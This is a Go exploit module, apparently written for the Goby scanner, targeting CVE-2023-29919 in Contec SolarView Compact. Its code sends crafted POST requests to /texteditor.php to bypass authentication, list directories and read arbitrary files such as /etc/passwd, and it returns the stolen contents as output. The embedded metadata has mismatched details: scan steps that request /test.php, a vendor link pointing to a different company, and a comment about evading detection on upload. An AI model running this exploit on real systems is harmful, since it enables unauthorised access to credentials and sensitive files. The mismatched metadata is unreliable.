package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SolarView Compact /texteditor.php file reading vulnerability (CVE-2023-29919)",
    "Description": "<p>A vulnerability exists in SolarView Compact 6.00 and earlier that allows an attacker to bypass authentication and read arbitrary files via textteditor.php.</p>",
    "Product": "Contec SolarView Compact",
    "Homepage": "https://www.contec.com/cn/products-services/environmental-monitoring/solarview/",
    "DisclosureDate": "2023-05-22",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "body=\"SolarView Compact\" && title=\"Top\"",
    "GobyQuery": "body=\"SolarView Compact\" && title=\"Top\"",
    "Level": "3",
    "Impact": "<p>This vulnerability may allow an attacker to bypass authentication and read files arbitrarily, causing sensitive information leakage and system security risks.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.example.com\">https://www.sierrawireless.com/</a></p>",
    "References": [
        "https://github.com/xiaosed/CVE-2023-29919",
        "https://nvd.nist.gov/vuln/detail/CVE-2023-29919",
        "https://www.solarview.io/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "file,dir",
            "show": ""
        },
        {
            "name": "dirName",
            "type": "input",
            "value": "/etc",
            "show": "attackType=dir"
        },
        {
            "name": "fileName",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=file"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "Directory Traversal"
    ],
    "VulType": [
        "Directory Traversal",
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-29919"
    ],
    "CNNVD": [
        "CNNVD-202305-2022"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.1",
    "Translation": {
        "CN": {
            "Name": "SolarView Compact /texteditor.php 文件读取漏洞（CVE-2023-29919）",
            "Product": "SolarView Compact",
            "Description": "<p>在 SolarView Compact 6.00 及更早版本存在一个漏洞，允许攻击者通过 textteditor.php 绕过身份验证并任意读取文件。</p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"http://www.example.com\" target=\"_blank\">https://www.sierrawireless.com/</a></p>",
            "Impact": "<p>该漏洞可能导致攻击者绕过身份验证并任意读取文件，造成敏感信息泄露和系统安全风险。</p>",
            "VulType": [
                "文件读取",
                "目录遍历"
            ],
            "Tags": [
                "文件读取",
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "SolarView Compact /texteditor.php file reading vulnerability (CVE-2023-29919)",
            "Product": "Contec SolarView Compact",
            "Description": "<p>A vulnerability exists in SolarView Compact 6.00 and earlier that allows an attacker to bypass authentication and read arbitrary files via textteditor.php.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<br><a href=\"http://www.example.com\" target=\"_blank\">https://www.sierrawireless.com/</a></p>",
            "Impact": "<p>This vulnerability may allow an attacker to bypass authentication and read files arbitrarily, causing sensitive information leakage and system security risks.</p>",
            "VulType": [
                "Directory Traversal",
                "File Read"
            ],
            "Tags": [
                "File Read",
                "Directory Traversal"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-03-18",
    "PocId": "10936"
}`
	uploadFilepolite3d3 := func(hostInfo *httpclient.FixUrl, dirname string, filename string) (*httpclient.HttpResponse, error) {
		// 对于同名的文件只能上传一次,否则会被更改文件名，且有的系统可以上传，但对存在文件夹路径做了鉴权处理，访问需要权限,有的有防火墙，需要做免杀，故文件上传 payload 均做了免杀。POC检测的为成功上传且可以访问的
		uploadRequestConfig := httpclient.NewPostRequestConfig("/texteditor.php")
		uploadRequestConfig.VerifyTls = false
		uploadRequestConfig.FollowRedirect = false
		uploadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		//uploadRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryt1qdEWTI01cj5BLV")
		uploadRequestConfig.Data = "directory=" + dirname + "&file=" + filename + "&open=%8AJ%82%AD&r_charset=none&newfile=&editfile="
		//uploadRequestConfig.Data = "------WebKitFormBoundaryt1qdEWTI01cj5BLV\r\nContent-Disposition: form-data; name=\"NewFile\"; filename=\"" + filename + "\"\r\nContent-Type: image/jpeg\r\n\r\n" + content + "\r\n------WebKitFormBoundaryt1qdEWTI01cj5BLV\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nupload\r\n------WebKitFormBoundaryt1qdEWTI01cj5BLV--\r\n"
		if resp, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig); resp != nil && resp.StatusCode == 200 {
			return resp, nil
		} else if err != nil {
			return nil, err
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			respOne, _ := uploadFilepolite3d3(hostInfo, "/etc", "")
			if respOne != nil {
				ss.VulURL = hostInfo.FixedHostInfo + "/texteditor.php"
				return strings.Contains(respOne.Utf8Html, "passwd")
			}
			respTwo, _ := uploadFilepolite3d3(hostInfo, "/home/www/html", "")
			if respTwo != nil {
			ss.VulURL = hostInfo.FixedHostInfo + "/texteditor.php"
				return strings.Contains(respTwo.Utf8Html, "texteditor.php")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attacktype := goutils.B2S(ss.Params["attackType"])
			dirname := goutils.B2S(ss.Params["dirName"])
			filename := goutils.B2S(ss.Params["fileName"])
			if attacktype == "dir" {
				resp, _ := uploadFilepolite3d3(expResult.HostInfo, dirname, "")
				if resp != nil {
					expResult.Success = true
					re := regexp.MustCompile(`(<option>)(.*?)(</option>)`).FindAllString(resp.Utf8Html, -1)
					for _, v := range re {
						expResult.Output += strings.TrimRight(strings.TrimLeft(v, "<option>"), "</option>") + "\n"
					}
				}
			} else if attacktype == "file" {
				fullname := filename
				filename = regexp.MustCompile(`\/([^\/]+)$`).FindString(fullname)
				dirname_new := strings.TrimRight(fullname, filename)
				resp, _ := uploadFilepolite3d3(expResult.HostInfo, dirname_new, strings.TrimLeft(filename, "/"))
				if resp != nil {
					if strings.Contains(resp.Utf8Html, `Permission`) {
						expResult.Success = false
						expResult.Output = "Permission denied"
						return expResult
					}
					expResult.Success = true
					raw := regexp.MustCompile(`(rows="30">)([\s\S]*)(</textarea>)`).FindString(resp.Utf8Html)
					expResult.Output = strings.TrimLeft(strings.TrimRight(raw, `</textarea>`), `rows="30">`) + "\n"
				}
			}
			return expResult
		},
	))
}
